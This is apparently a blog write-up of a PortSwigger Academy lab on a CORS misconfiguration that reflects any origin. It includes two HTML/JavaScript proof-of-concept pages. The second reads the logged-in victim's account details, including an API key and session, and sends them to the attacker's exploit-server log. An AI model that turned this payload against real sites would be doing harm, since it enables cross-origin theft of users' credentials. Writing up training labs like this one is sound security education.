---
layout: post
title:  "CORS vulnerability with basic origin reflection"
date:   2024-10-16 11:20:54 +0530
categories: [BSCP, CORS]
---

## Introduction

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: **wiener:peter** 

## Solution

Looks like an ecommerce website which we faced in other labs as well 

![]({{ site.baseurl }}/assets/images/cors-1.png)

Through the lab objective, we have also have our own account where you can login using these credentials `wiener:peter` and once after login, we also have our own API key 

![]({{ site.baseurl }}/assets/images/cors-2.png)

Looking into the source, we found a javascript code snippet where it fetches the API key through an endpoint called `/accountDetails` with headers as `credentials: include` which means you should be logged in on any account where as cookie is sent along with the request and then dumps the information in a json format.. Then, it updates an element on the webpage with the ID `apikey` to display the `apikey` from the response data.

```js
fetch('/accountDetails', {credentials:'include'})
      .then(r => r.json())
      .then(j => document.getElementById('apikey').innerText = j.apikey)
```

Accessing the `/accountDetails` endpoint presented with some sensitive values like **sessions, email, APIkey and username** in a JSON format 

![]({{ site.baseurl }}/assets/images/cors-3.png)

In order to check whether the cross origin, we can intercept the request in burpsuite, send it to repeater, send the request and analysing the response shows that the `Access-Control-Allow-Credentials` set to true which means the credentials are allowed to sent along the request 

![]({{ site.baseurl }}/assets/images/cors-4.png)

Now In the request, pass along the header called `Origin:` with a value as `https://example.com` and sent the request.. In the response shows that `ACAO` set to our own example website which we passed via `Origin:` header 

![]({{ site.baseurl }}/assets/images/cors-5.png)

Now with a sample CORS, we can check whether we can dump the info from `/accountDetails` endpoint locally with the following POC

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://0acf00300445651880a44e0c002000f5.web-security-academy.net/accountDetails", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
 ```

Save this as HTML file locally and open in any browser, click on exploit and now you will be presented with the response information as a popup with the current loggedin user 

![]({{ site.baseurl }}/assets/images/cors-6.png)

Now again in order to solve the lab, we need to steal the administrator's API key 

**With the following POC,**

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a90007603b4470f808430ae0091001b.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

In the exploit server, with the above POC and click on deliver to victim.. Checking the access log we can see the admin credentials

![]({{ site.baseurl }}/assets/images/cors-7.png)

Take the admin API key and submit it as solution to solve the lab 

![]({{ site.baseurl }}/assets/images/cors-8.png)